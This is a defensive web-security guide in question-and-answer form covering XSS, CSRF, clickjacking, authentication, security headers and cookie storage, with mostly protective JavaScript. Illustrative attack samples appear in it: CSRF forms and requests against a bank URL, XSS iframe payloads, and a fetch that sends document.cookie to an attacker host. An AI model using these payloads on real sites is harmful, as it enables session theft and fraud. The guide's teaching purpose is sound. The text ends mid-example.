# **🔒 Web Application Security Guide**

Web security is crucial for protecting applications and users from various
attacks. Here are the key concepts with JavaScript examples:

## Table of Contents

- [Cross-Site Scripting (XSS)](<#cross-site-scripting-(xss)>)
- [Cross-Site Request Forgery (CSRF)](<#cross-site-request-forgery-(csrf)>)
- [IFrame Security](#iframe-security)
- [Authentication vs Authorization](#authentication-vs-authorization)
- [Security Headers](#security-headers)
- [Client-Side Storage Security](#client-side-storage-security)
- [HTTPS and SSL/TLS](#https-and-ssl/tls)
- [Dependency Security](#dependency-security)

## Cross-Site Scripting (XSS)

### 1. What is XSS, and how does it pose a security risk in web applications?

Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers
to inject malicious scripts into web pages viewed by other users. It occurs when
a web application includes untrusted data in a web page without proper
validation or escaping.

**Types of XSS:**

- **Stored XSS (Persistent)**: Malicious script is stored on the server (e.g.,
  in a database) and executed when users view the affected page
- **Reflected XSS (Non-persistent)**: Malicious script is reflected off the web
  server, typically through URL parameters or form submissions
- **DOM-based XSS**: The vulnerability exists in client-side code rather than
  server-side code

**Security Risks:**

- Session hijacking through cookie theft
- Account takeover
- Defacement of websites
- Redirection to malicious sites
- Keylogging and credential harvesting
- Spreading malware
- Performing actions on behalf of victims

### 2. Explain the concept of output encoding and its role in preventing XSS attacks.

Output encoding (also called output escaping) is the process of converting
potentially dangerous characters into their safe equivalents before displaying
data in a web page. It ensures that user input is treated as data rather than
executable code.

**Common Encoding Types:**

- **HTML Entity Encoding**: Converts characters like `<`, `>`, `&`, `"`, `'`
  into HTML entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#x27;`)
- **JavaScript Encoding**: Escapes characters that have special meaning in
  JavaScript contexts
- **URL Encoding**: Encodes characters for safe inclusion in URLs
- **CSS Encoding**: Escapes characters for CSS contexts

**Implementation Example:**

```javascript
// HTML encoding function
function htmlEncode(str) {
  return str.replace(/[&<>"']/g, function (match) {
    switch (match) {
      case '&':
        return '&amp;';
      case '<':
        return '&lt;';
      case '>':
        return '&gt;';
      case '"':
        return '&quot;';
      case "'":
        return '&#x27;';
    }
  });
}
```

**Best Practices:**

- Encode output based on the context (HTML, JavaScript, CSS, URL)
- Use context-appropriate encoding libraries
- Apply encoding at the point of output, not input
- Use template engines with automatic escaping

### 3. How can a Content Security Policy (CSP) help mitigate XSS vulnerabilities?

Content Security Policy (CSP) is a security header that helps prevent XSS
attacks by controlling which resources the browser is allowed to load and
execute. It acts as an additional layer of protection by restricting the sources
of scripts, stylesheets, images, and other resources.

**How CSP Works:**

- Defines a whitelist of trusted sources for various resource types
- Blocks inline scripts and styles by default (unless explicitly allowed)
- Prevents execution of eval() and similar functions
- Can require nonces or hashes for inline content

**CSP Directives:**

```http
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self';
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
```

**Benefits:**

- Prevents execution of malicious scripts from unauthorized sources
- Blocks inline JavaScript execution (major XSS vector)
- Provides detailed violation reports for monitoring
- Reduces attack surface significantly

### 4. Discuss the impact of XSS on user privacy and data integrity.

**Privacy Impact:**

- **Session Token Theft**: Attackers can steal authentication cookies and
  impersonate users
- **Personal Data Exposure**: Scripts can access and exfiltrate sensitive
  information displayed on the page
- **Keystroke Logging**: Malicious scripts can capture user input including
  passwords and personal data
- **Location Tracking**: Scripts can access geolocation APIs and track user
  movements
- **Behavioral Tracking**: Attackers can monitor user interactions and browsing
  patterns

**Data Integrity Impact:**

- **Data Modification**: Scripts can alter form data before submission
- **Unauthorized Transactions**: Attackers can perform actions on behalf of
  users (transfers, purchases, etc.)
- **Content Manipulation**: Page content can be modified to spread
  misinformation
- **Account Settings Changes**: Scripts can modify user preferences and security
  settings
- **Database Corruption**: In severe cases, XSS can lead to data corruption
  through unauthorized modifications

**Long-term Consequences:**

- Loss of user trust and reputation damage
- Legal liabilities and compliance violations
- Financial losses from fraudulent transactions
- Identity theft and fraud affecting users
- Regulatory penalties and fines

### 5. What are some best practices for developers to prevent XSS attacks in their applications?

**Input Validation:**

- Validate all user input against expected formats
- Use whitelist validation rather than blacklist
- Implement server-side validation (never rely solely on client-side)
- Sanitize input by removing or encoding dangerous characters

**Output Encoding:**

- Encode all dynamic content based on output context
- Use established encoding libraries and frameworks
- Apply encoding at the point of output, not storage
- Implement context-aware encoding (HTML, JavaScript, CSS, URL)

**Content Security Policy:**

- Implement strict CSP headers
- Avoid 'unsafe-inline' and 'unsafe-eval' directives
- Use nonces or hashes for required inline content
- Monitor CSP violation reports

**Secure Development Practices:**

- Use parameterized queries and prepared statements
- Implement proper session management
- Use HTTP-only and Secure flags for cookies
- Regular security testing and code reviews
- Keep frameworks and libraries updated
- Use template engines with automatic escaping
- Implement proper error handling without exposing sensitive information

**Framework-Specific Protections:**

- Leverage built-in XSS protections in modern frameworks
- Use framework-provided sanitization functions
- Configure frameworks for maximum security by default

---

## Cross-Site Request Forgery (CSRF)

### 6. What is CSRF, and how does it work as an attack vector?

Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user
to execute unwanted actions on a web application. The attacker tricks the user's
browser into sending a forged HTTP request, including the user's session cookies
and authentication information.

**How CSRF Works:**

1. User logs into a legitimate website (e.g., bank.com)
2. User visits a malicious website while still authenticated
3. Malicious site contains code that sends requests to the legitimate site
4. Browser automatically includes authentication cookies with the request
5. Legitimate site processes the request as if it came from the user

**Attack Examples:**

```html
<!-- Simple CSRF attack via image tag -->
<img
  src="https://bank.com/transfer?to=attacker&amount=1000"
  width="0"
  height="0"
/>

<!-- CSRF via form auto-submission -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>

<!-- CSRF via AJAX -->
<script>
  fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',
    body: 'to=attacker&amount=1000',
  });
</script>
```

**Conditions Required for CSRF:**

- User must be authenticated to the target application
- Application must rely solely on automatic authentication (cookies, HTTP auth)
- Attacker must know the structure of the vulnerable request
- No unpredictable request parameters

### 7. Explain the role of anti-CSRF tokens in preventing CSRF attacks.

Anti-CSRF tokens (also called synchronizer tokens) are unpredictable, unique
values included in forms and AJAX requests to verify that the request originated
from the legitimate application rather than a malicious site.

**How Anti-CSRF Tokens Work:**

1. Server generates a unique, unpredictable token for each user session
2. Token is embedded in forms as a hidden field or included in AJAX headers
3. When processing requests, server validates that the token matches the
   expected value
4. Requests without valid tokens are rejected

**Implementation Example:**

```html
<!-- HTML Form with CSRF token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="abc123xyz789" />
  <input type="text" name="recipient" />
  <input type="number" name="amount" />
  <button type="submit">Transfer</button>
</form>
```

```javascript
// Server-side validation (Node.js/Express example)
app.post('/transfer', (req, res) => {
  const receivedToken = req.body.csrf_token;
  const sessionToken = req.session.csrf_token;

  if (!receivedToken || receivedToken !== sessionToken) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Process legitimate request
  processTransfer(req.body);
});
```

**Token Generation Best Practices:**

- Use cryptographically secure random number generators
- Generate new tokens for each session or request
- Store tokens securely (session storage, encrypted cookies)
- Ensure tokens are sufficiently long and unpredictable
- Implement proper token lifecycle management

### 8. How does the SameSite cookie attribute contribute to CSRF protection?

The SameSite cookie attribute is a security feature that controls when cookies
are sent with cross-site requests, providing built-in CSRF protection by
preventing cookies from being included in requests initiated by third-party
sites.

**SameSite Values:**

- **Strict**: Cookie is only sent with same-site requests
- **Lax**: Cookie is sent with same-site requests and top-level navigation from
  external sites
- **None**: Cookie is sent with all requests (requires Secure flag)

**Configuration Examples:**

```http
Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
Set-Cookie: sessionid=abc123; SameSite=Lax; Secure; HttpOnly
Set-Cookie: tracking=xyz789; SameSite=None; Secure
```

**Protection Mechanisms:**

- **Strict Mode**: Provides strongest CSRF protection but may impact user
  experience (users need to re-authenticate when following external links)
- **Lax Mode**: Balances security and usability, allows authentication cookies
  for GET requests from external links but blocks them for POST/AJAX requests
- **None Mode**: Provides no CSRF protection but necessary for legitimate
  cross-site functionality

**Limitations:**

- Not supported by older browsers
- Doesn't protect against same-site CSRF attacks
- Lax mode still allows some cross-site requests
- Should be used in combination with other CSRF protections

### 9. Discuss scenarios where CSRF attacks can have severe consequences.

**Financial Services:**

- **Unauthorized Transfers**: Attackers can transfer money from victim's
  accounts
- **Investment Manipulation**: Buying/selling stocks or other securities without
  consent
- **Credit Applications**: Applying for loans or credit cards in victim's name
- **Payment Processing**: Making unauthorized payments or purchases

**Healthcare Systems:**

- **Medical Record Modification**: Changing patient medical histories or
  prescriptions
- **Appointment Scheduling**: Creating or canceling medical appointments
- **Insurance Claims**: Filing fraudulent insurance claims
- **Access Control**: Modifying patient access permissions

**Corporate Systems:**

- **Employee Management**: Hiring, firing, or modifying employee records
- **Financial Approvals**: Approving large expenditures or contracts
- **System Administration**: Creating admin accounts or modifying security
  settings
- **Data Access**: Granting unauthorized access to sensitive corporate data

**Social Media and Communications:**

- **Account Takeover**: Changing passwords or security settings
- **Content Publishing**: Posting malicious or embarrassing content
- **Privacy Settings**: Modifying privacy controls to expose personal
  information
- **Relationship Management**: Sending messages or friend requests

**Government and Legal Systems:**

- **Voting Systems**: Manipulating electronic voting processes
- **Legal Filings**: Submitting false legal documents or applications
- **Tax Systems**: Filing fraudulent tax returns
- **Benefits Systems**: Applying for or modifying government benefits

**Impact Amplification Factors:**

- High-privilege user accounts (administrators, executives)
- Automated systems that process requests without human review
- Systems with limited audit trails or monitoring
- Integration with other critical systems
- Real-time processing without rollback capabilities

### 10. What are common methods to secure against CSRF attacks in web applications?

**Token-Based Protection:**

```javascript
// Synchronizer Token Pattern
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});
```

**Double-Submit Cookie Pattern:**

```javascript
// Generate and set CSRF cookie
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    const token = generateSecureToken();
    res.cookie('csrfToken', token, {
      httpOnly: false, // Accessible to JavaScript
      secure: true,
      sameSite: 'strict',
    });
  }
  next();
});

// Validate token in requests
app.post('/api/*', (req, res, next) => {
  const cookieToken = req.cookies.csrfToken;
  const headerToken = req.headers['x-csrf-token'];

  if (cookieToken !== headerToken) {
    return res.status(403).json({ error: 'CSRF token mismatch' });
  }
  next();
});
```

**SameSite Cookie Configuration:**

```javascript
app.use(
  session({
    name: 'sessionId',
    secret: 'your-secret-key',
    cookie: {
      sameSite: 'lax', // or 'strict' for stronger protection
      secure: true, // HTTPS only
      httpOnly: true, // Prevent XSS
    },
  })
);
```

**Custom Header Validation:**

```javascript
// Require custom header for AJAX requests
app.use('/api/', (req, res, next) => {
  const customHeader = req.headers['x-requested-with'];
  if (customHeader !== 'XMLHttpRequest') {
    return res.status(403).json({ error: 'Missing required header' });
  }
  next();
});
```

**Origin and Referer Validation:**

```javascript
app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://yourapp.com', 'https://www.yourapp.com'];

  if (req.method !== 'GET' && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
});
```

**Framework-Specific Solutions:**

- **Laravel**: Built-in CSRF middleware with `@csrf` blade directive
- **Django**: CSRF middleware with `{% csrf_token %}` template tag
- **Rails**: `protect_from_forgery` with authenticity tokens
- **ASP.NET**: Anti-forgery tokens with `@Html.AntiForgeryToken()`

---

## IFrame Security

### 11. Why are IFrames a potential security risk, and how can they be used maliciously?

IFrames (inline frames) can pose security risks because they allow embedding
external content within web pages, potentially creating attack vectors for
malicious actors.

**Security Risks:**

**Clickjacking Attacks:**

- Malicious sites embed legitimate sites in transparent iframes
- Users unknowingly click on hidden elements
- Can lead to unauthorized actions on legitimate sites

**UI Redressing:**

- Overlaying malicious content over legitimate interfaces
- Tricking users into interacting with hidden elements
- Stealing credentials or sensitive information

**Cross-Frame Scripting:**

- Scripts in parent frames accessing child frame content
- Scripts in child frames accessing parent frame content
- Bypassing same-origin policy restrictions

**Malicious Examples:**

```html
<!-- Clickjacking attack -->
<iframe
  src="https://bank.com/transfer"
  style="opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
>
</iframe>
<button onclick="alert('You just transferred money!')">
  Click for free gift!
</button>

<!-- Content injection -->
<iframe src="javascript:alert('XSS via iframe')"></iframe>

<!-- Protocol confusion -->
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

**Data Exfiltration Risks:**

- Embedded iframes can access parent page information
- Malicious ads or widgets collecting user data
- Third-party content accessing sensitive page information

### 12. Describe techniques to prevent clickjacking and other IFrame-related attacks.

**X-Frame-Options Header:**

```http
X-Frame-Options: DENY                    # Never allow framing
X-Frame-Options: SAMEORIGIN             # Only allow same-origin framing
X-Frame-Options: ALLOW-FROM https://trusted-site.com  # Allow specific origins
```

**Content Security Policy (Frame Ancestors):**

```http
Content-Security-Policy: frame-ancestors 'none';                    # Equivalent to DENY
Content-Security-Policy: frame-ancestors 'self';                    # Equivalent to SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self' https://trusted.com; # Allow specific origins
```

**JavaScript Frame-Busting:**

```javascript
// Basic frame-busting
if (top !== self) {
  top.location = self.location;
}

// More robust frame-busting
(function () {
  if (top !== self) {
    try {
      if (top.location.hostname !== self.location.hostname) {
        throw new Error('Iframe detected');
      }
    } catch (e) {
      top.location = self.location;
    }
  }
})();

// Modern approach with error handling
if (window !== window.top) {
  try {
    window.top.location = window.location;
  } catch (e) {
    document.body.innerHTML =
      '<h1>This page cannot be displayed in a frame</h1>';
  }
}
```

**Secure IFrame Implementation:**

```html
<!-- Restricting iframe capabilities -->
<iframe
  src="https://trusted-site.com"
  sandbox="allow-scripts allow-same-origin"
  referrerpolicy="no-referrer"
>
</iframe>

<!-- Preventing clickjacking with CSS -->
<style>
  body {
    display: none;
  }
</style>
<script>
  if (self === top) {
    document.body.style.display = 'block';
  } else {
    top.location = self.location;
  }
</script>
```

**Sandbox Attribute Values:**

- `allow-forms`: Allow form submissions
- `allow-scripts`: Allow script execution
- `allow-same-origin`: Allow same-origin access
- `allow-popups`: Allow popups
- `allow-pointer-lock`: Allow pointer lock API
- `allow-top-navigation`: Allow navigation of top-level context

### 13. How does the X-Frame-Options header contribute to IFrame protection?

The X-Frame-Options header is a security mechanism that controls whether a
browser should allow a page to be displayed within an iframe, embed, or object
element.

**Header Values and Behavior:**

**DENY:**

```http
X-Frame-Options: DENY
```

- Completely prevents the page from being displayed in any frame
- Strongest protection against clickjacking
- May break legitimate use cases requiring framing

**SAMEORIGIN:**

```http
X-Frame-Options: SAMEORIGIN
```

- Allows framing only if the parent page is from the same origin
- Balances security with functionality
- Prevents cross-origin clickjacking while allowing internal framing

**ALLOW-FROM (Deprecated):**

```http
X-Frame-Options: ALLOW-FROM https://trusted-domain.com
```

- Allows framing only from specified origins
- Limited browser support and deprecated
- CSP frame-ancestors directive is preferred

**Implementation Examples:**

**Apache Configuration:**

```apache
Header always set X-Frame-Options SAMEORIGIN
```

**Nginx Configuration:**

```nginx
add_header X-Frame-Options SAMEORIGIN always;
```

**Application-Level Implementation:**

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});

// PHP
header('X-Frame-Options: SAMEORIGIN');

// ASP.NET
Response.Headers.Add('X-Frame-Options', 'SAMEORIGIN');
```

**Limitations:**

- Per-page basis only (cannot specify different policies for different frames)
- Limited granular control compared to CSP
- ALLOW-FROM has poor browser support
- Can be bypassed in some older browsers

**Modern Alternative - CSP frame-ancestors:**

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

Benefits over X-Frame-Options:

- Better browser support
- More granular control
- Can specify multiple allowed origins
- Part of comprehensive CSP implementation

---

## Authentication vs Authorization

### 14. Differentiate between authentication and authorization in the context of web security.

**Authentication** is the process of verifying the identity of a user, device,
or system. It answers the question "Who are you?"

**Authorization** is the process of determining whether an authenticated user
has permission to access specific resources or perform certain actions. It
answers the question "What are you allowed to do?"

**Authentication Process:**

1. **Identity Claim**: User provides credentials (username/password,
   certificate, biometric)
2. **Credential Verification**: System validates the provided credentials
3. **Identity Establishment**: System confirms user identity and creates a
   session

**Authentication Methods:**

```javascript
// Password-based authentication
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({ username });

  if (user && (await bcrypt.compare(password, user.hashedPassword))) {
    req.session.userId = user.id;
    res.json({ message: 'Authentication successful' });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Multi-factor authentication
app.post('/verify-mfa', async (req, res) => {
  const { userId, totpCode } = req.body;
  const user = await User.findById(userId);

  if (
    speakeasy.totp.verify({
      secret: user.mfaSecret,
      encoding: 'base32',
      token: totpCode,
    })
  ) {
    req.session.authenticated = true;
    res.json({ message: 'MFA verification successful' });
  } else {
    res.status(401).json({ error: 'Invalid MFA code' });
  }
});
```

**Authorization Process:**

1. **Resource Request**: Authenticated user requests access to a resource
2. **Permission Check**: System evaluates user's permissions against required
   permissions
3. **Access Decision**: System grants or denies access based on authorization
   rules

**Authorization Models:**

**Role-Based Access Control (RBAC):**

```javascript
// Role-based authorization middleware
const requireRole = (roles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Authentication required' });
    }

    if (!roles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }

    next();
  };
};

// Usage
app.delete('/admin/users/:id', requireRole(['admin']), deleteUser);
app.get('/reports', requireRole(['admin', 'manager']), getReports);
```

**Attribute-Based Access Control (ABAC):**

```javascript
// Policy-based authorization
const authorize = (policy) => {
  return (req, res, next) => {
    const context = {
      user: req.user,
      resource: req.params,
      action: req.method,
      environment: { time: new Date(), ip: req.ip },
    };

    if (evaluatePolicy(policy, context)) {
      next();
    } else {
      res.status(403).json({ error: 'Access denied' });
    }
  };
};
```

**Key Differences:**

| Aspect   | Authentication                | Authorization                |
| -------- | ----------------------------- | ---------------------------- |
| Purpose  | Verify identity               | Control access               |
| Question | "Who are you?"                | "What can you do?"           |
| Process  | Login/credential verification | Permission checking          |
| Result   | User identity established     | Access granted/denied        |
| Timing   | Happens first                 | Happens after authentication |
| Failure  | Login fails                   | Access forbidden (403)       |

**Security Best Practices:**

- Always authenticate before authorizing
- Use strong authentication mechanisms (MFA, certificates)
- Implement least privilege principle for authorization
- Regularly audit and update permissions
- Separate authentication and authorization logic
- Use secure session management
- Implement proper error handling for both processes

---

## Security Headers

### 15. Name and describe key security headers used to enhance web application security.

Security headers are HTTP response headers that instruct browsers to enable
built-in security features, helping protect web applications from various
attacks.

**Content Security Policy (CSP):**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
```

- Controls resource loading sources
- Prevents XSS attacks
- Reduces injection attack surface

**X-Frame-Options:**

```http
X-Frame-Options: SAMEORIGIN
```

- Prevents clickjacking attacks
- Controls iframe embedding
- Values: DENY, SAMEORIGIN, ALLOW-FROM

**X-Content-Type-Options:**

```http
X-Content-Type-Options: nosniff
```

- Prevents MIME type sniffing
- Forces browsers to respect declared content types
- Reduces risk of content-type confusion attacks

**X-XSS-Protection:**

```http
X-XSS-Protection: 1; mode=block
```

- Enables browser's built-in XSS filtering
- Blocks pages when XSS attacks are detected
- Being deprecated in favor of CSP

**Referrer-Policy:**

```http
Referrer-Policy: strict-origin-when-cross-origin
```

- Controls referrer information sent with requests
- Protects user privacy
- Prevents information leakage

**Permissions-Policy (formerly Feature-Policy):**

```http
Permissions-Policy: camera=(), microphone=(), geolocation=(self)
```

- Controls access to browser features and APIs
- Prevents unauthorized access to sensitive capabilities
- Enhances user privacy

**Cross-Origin-Embedder-Policy (COEP):**

```http
Cross-Origin-Embedder-Policy: require-corp
```

- Controls cross-origin resource embedding
- Enables SharedArrayBuffer and high-precision timers
- Works with COOP for process isolation

**Cross-Origin-Opener-Policy (COOP):**

```http
Cross-Origin-Opener-Policy: same-origin
```

- Controls cross-origin window interactions
- Prevents cross-origin attacks through window references
- Enables process isolation

**Complete Security Headers Implementation:**

```javascript
// Express.js security headers middleware
app.use((req, res, next) => {
  // HSTS
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );

  // CSP
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
  );

  // Frame protection
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');

  // Content type protection
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // XSS protection
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // Referrer policy
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Permissions policy
  res.setHeader(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(self)'
  );

  next();
});
```

### 16. Explain how the Strict-Transport-Security (HSTS) header improves security.

HTTP Strict Transport Security (HSTS) is a security mechanism that forces
browsers to interact with websites exclusively over HTTPS, preventing protocol
downgrade attacks and cookie hijacking.

**HSTS Header Syntax:**

```http
Strict-Transport-Security: max-age=<expire-time>; includeSubDomains; preload
```

**Parameters:**

- **max-age**: Duration (in seconds) that the browser should remember to only
  access the site via HTTPS
- **includeSubDomains**: Applies the policy to all subdomains
- **preload**: Allows inclusion in browser preload lists

**Implementation Examples:**

```http
# Basic HSTS (1 year)
Strict-Transport-Security: max-age=31536000

# HSTS with subdomains (1 year)
Strict-Transport-Security: max-age=31536000; includeSubDomains

# HSTS with preload (2 years minimum required)
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

**Server Configuration:**

**Apache:**

```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
```

**Nginx:**

```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**Application Level:**

```javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains; preload'
  );
  next();
});
```

**Security Benefits:**

**Protocol Downgrade Attack Prevention:**

- Prevents attackers from forcing connections to HTTP
- Eliminates man-in-the-middle attacks that rely on HTTP connections
- Protects against SSL stripping attacks

**Cookie Hijacking Protection:**

- Ensures session cookies are only transmitted over encrypted connections
- Prevents session theft over unsecured networks
- Protects authentication tokens and sensitive data

**Browser Behavior Changes:**

- Browsers automatically convert HTTP requests to HTTPS
- Invalid certificates cause hard failures (no bypass option)
- Prevents users from ignoring certificate warnings

**HSTS Preload Lists:**

- Major browsers maintain lists of HSTS-enabled sites
- Sites are automatically accessed via HTTPS even on first visit
- Provides protection before the first HSTS header is received

**Best Practices:**

- Start with shorter max-age values during testing
- Use includeSubDomains only if all subdomains support HTTPS
- Submit to preload lists for maximum protection
- Monitor certificate expiration to avoid lockouts
- Have a plan for disabling HSTS if needed (set max-age=0)

**Considerations:**

- HSTS only works after the first HTTPS visit (preload lists solve this)
- Cannot be disabled by users once activated
- Requires valid SSL/TLS certificates for all covered domains
- May cause issues if HTTPS support is later removed

---

## Client-Side Storage Security

### 17. Discuss security considerations when using client-side storage mechanisms like cookies and localStorage.

Client-side storage mechanisms pose various security risks that must be
carefully managed to protect user data and application security.

**Cookies Security Considerations:**

**Cross-Site Scripting (XSS) Vulnerabilities:**

```javascript
// Vulnerable: JavaScript can access cookies
document.cookie = "sessionId=abc123";
console.log(document.cookie); // Accessible to malicious scripts

// Secure: HttpOnly flag prevents JavaScript access
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

**Cross-Site Request Forgery (CSRF) Risks:**

```javascript
// Vulnerable: Cookies sent with all requests
Set-Cookie: sessionId=abc123

// Secure: SameSite attribute prevents cross-site sending
Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
```

**Man-in-the-Middle Attacks:**

```http
# Vulnerable: Cookie sent over HTTP
Set-Cookie: sessionId=abc123

# Secure: Secure flag ensures HTTPS-only transmission
Set-Cookie: sessionId=abc123; Secure; HttpOnly
```

**localStorage Security Considerations:**

**XSS Attack Vector:**

```javascript
// Vulnerable: Storing sensitive data in localStorage
localStorage.setItem('apiKey', 'secret-api-key');
localStorage.setItem('userToken', 'jwt-token');

// Malicious script can access all localStorage data
const stolenData = JSON.stringify(localStorage);
// Send stolen data to attacker's server
```

**Persistent Storage Risks:**

- Data persists until explicitly removed
- Survives browser restarts and system reboots
- Can accumulate sensitive information over time
- Shared across all tabs/windows of the same origin

**sessionStorage Security Considerations:**

**Tab-Specific Vulnerabilities:**

```javascript
// sessionStorage is isolated per tab but still vulnerable to XSS
sessionStorage.setItem('tempData', 'sensitive-info');

// Malicious script in the same tab can access it
const sensitiveData = sessionStorage.getItem('tempData');
```

**Security Best Practices:**

**Cookie Security Implementation:**

```javascript
// Secure cookie configuration
app.use(
  session({
    name: 'sessionId',
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: process.env.NODE_ENV === 'production', // HTTPS only in production
      httpOnly: true, // Prevent XSS access
      maxAge: 1800000, // 30 minutes
      sameSite: 'strict', // CSRF protection
    },
  })
);
```

**Data Encryption for Client Storage:**

```javascript
// Encrypt sensitive data before storing
const CryptoJS = require('crypto-js');

function secureStore(key, data) {
  const encrypted = CryptoJS.AES.encrypt(
    JSON.stringify(data),
    SECRET_KEY
  ).toString();
  localStorage.setItem(key, encrypted);
}

function secureRetrieve(key) {
  const encrypted = localStorage.getItem(key);
  if (encrypted) {
    const decrypted = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
    return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8));
  }
  return null;
}
```

**Input Validation and Sanitization:**

```javascript
// Validate data before storing
function safeStore(key, value) {
  if (typeof key !== 'string' || key.length === 0) {
    throw new Error('Invalid key');
  }

  if (typeof value !== 'string') {
    value = JSON.stringify(value);
  }

  // Sanitize value to prevent injection attacks
  const sanitizedValue = DOMPurify.sanitize(value);
  localStorage.setItem(key, sanitizedValue);
}
```

**Storage Quotas and Cleanup:**

```javascript
// Implement storage cleanup to prevent data accumulation
function cleanupExpiredData() {
  Object.keys(localStorage).forEach((key) => {
    try {
      const item = JSON.parse(localStorage.getItem(key));
      if (item.expiry && Date.now() > item.expiry) {
        localStorage.removeItem(key);
      }
    } catch (e) {
      // Handle corrupted data
      localStorage.removeItem(key);
    }
  });
}

// Store data with expiration
function storeWithExpiry(key, value, ttl) {
  const now = new Date();
  const item = {
    value: value,
    expiry: now.getTime() + ttl,
  };
  localStorage.setItem(key, JSON.stringify(item));
}
```

### 18. How can SameSite cookies and the HttpOnly flag enhance client-storage security?

**SameSite Cookie Attribute:**

The SameSite attribute controls when cookies are sent with cross-site requests,
providing protection against CSRF attacks and some types of information leakage.

**SameSite Values and Behavior:**

**Strict Mode:**

```http
Set-Cookie: sessionId=abc123; SameSite=Strict; HttpOnly; Secure
```

- Cookie is only sent with same-site requests
- Provides strongest CSRF protection
- May impact user experience (requires re-authentication when following external
  links)

**Lax Mode (Default in modern browsers):**

```http
Set-Cookie: sessionId=abc123; SameSite=Lax; HttpOnly; Secure
```

- Cookie is sent with same-site requests and top-level navigation
- Balances security and usability
- Allows authentication cookies when users click external links

**None Mode:**

```http
Set-Cookie: trackingId=xyz789; SameSite=None; Secure
```

- Cookie is sent with all requests (same-site and cross-site)
- Requires Secure flag
- Used for legitimate cross-site functionality

**CSRF Protection Examples:**

**Before SameSite (Vulnerable):**

```html
<!-- Malicious site can trigger requests with cookies -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Cookie automatically included with request -->
```

**With SameSite=Strict (Protected):**

```html
<!-- Same request from malicious site -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
<!-- Cookie NOT included because it's a cross-site request -->
```

**HttpOnly Flag:**

The HttpOnly flag prevents client-side JavaScript from accessing cookies,
providing protection against XSS attacks.

**XSS Protection Examples:**

**Without HttpOnly (Vulnerable):**

```javascript
// Malicious script can steal cookies
const stolenCookies = document.cookie;
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: stolenCookies,
});
```

**With HttpOnly (Protected):**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

```javascript
// JavaScript cannot access HttpOnly cookies
console.log(document.cookie); // Does not include HttpOnly cookies
```

**Combined Security Implementation:**

**Secure Session Cookie Configuration:**

```javascript
// Express.js session configuration
app.use(
  session({
    name: 'sid',
    secret: process.env.SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true, // Prevent XSS access
      secure: true, // HTTPS only
      sameSite: 'strict', // CSRF protection
      maxAge: 1800000, // 30 minutes
      domain: '.example.com', // Scope to domain
    },
  })
);
```

**Authentication Cookie Best Practices:**

```javascript
// Set secure authentication cookie
function setAuthCookie(res, token) {
  res.cookie('authToken', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
    path: '/',
    domain: process.env.COOKIE_DOMAIN,
  });
}

// Clear authentication cookie securely
function clearAuthCookie(res) {
  res.clearCookie('authToken', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    path: '/',
    domain: process.env.COOKIE_DOMAIN,
  });
}
```

**Different Cookies for Different Purposes:**

```javascript
// Authentication cookie (most secure)
